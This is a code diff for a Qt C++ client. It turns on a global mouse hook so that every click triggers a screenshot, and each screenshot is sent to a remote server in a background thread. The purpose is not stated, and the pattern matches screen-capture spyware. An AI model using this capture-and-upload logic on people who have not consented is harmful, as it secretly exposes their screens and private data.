@@ -16,9 +16,6 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
 
     fileServer->start();
 
-    //TODO: add mousehook
-    //bind mousehook
-
     //Load config
     //Default path ./config.cfg
     if( ! loadConfig(*config) )
@@ -42,17 +39,38 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
     //connect(fileServer, &FileServer::dataGet, [this](qint64 a, qint64 b){ qDebug() << a/1024/1024 << b/1024/1024; });
 
     //Connect screenshot module
-    /*
-    connect(&MouseHook::instance(), &MouseHook::mouseClicked, &MouseHook::instance(), &MouseHook::makeScreenshot);
-    connect(&MouseHook::instance(), &MouseHook::screenSaved,
-            this, [this](QString path){
-                                            if (fileClient->connect())
-                                            {
-                                                fileClient->sendFile(path);
-                                                fileClient->disconnect();
-                                            }
-                                        });
-    */
+    //connect(&MouseHook::instance(), &MouseHook::mouseClicked, &MouseHook::instance(), &MouseHook::makeScreenshot);
+    connect(&MouseHook::instance(), &MouseHook::mouseClicked,
+            this, [this]()
+    {
+        //Thread for making screenshots files
+        QThread* thread = new QThread;
+        MakeScreen* scr = new MakeScreen(0);
+        scr->moveToThread(thread);
+
+        connect(thread, &QThread::started, scr, &MakeScreen::makeScreenshot);
+        connect(scr, &MakeScreen::screenSaved, thread, &QThread::quit);
+        connect(thread, &QThread::finished, thread, &QThread::deleteLater);
+        connect(thread, &QThread::finished, scr, &MakeScreen::deleteLater);
+
+        thread->start();
+
+        connect(scr, &MakeScreen::screenSaved,
+        this, [this](QString path)
+        {
+            //Thread for transferring files
+            QThread* thread = new QThread;
+            SendData* file = new SendData(0, path);
+            file->moveToThread(thread);
+
+            connect(thread, &QThread::started, file, &SendData::connectAndSendFile);
+            connect(file, &SendData::disconnected, thread, &QThread::quit);
+            connect(thread, &QThread::finished, thread, &QThread::deleteLater);
+            connect(thread, &QThread::finished, file, &SendData::deleteLater);
+
+            thread->start();
+            });
+    });
 }
 
 Client::~Client()
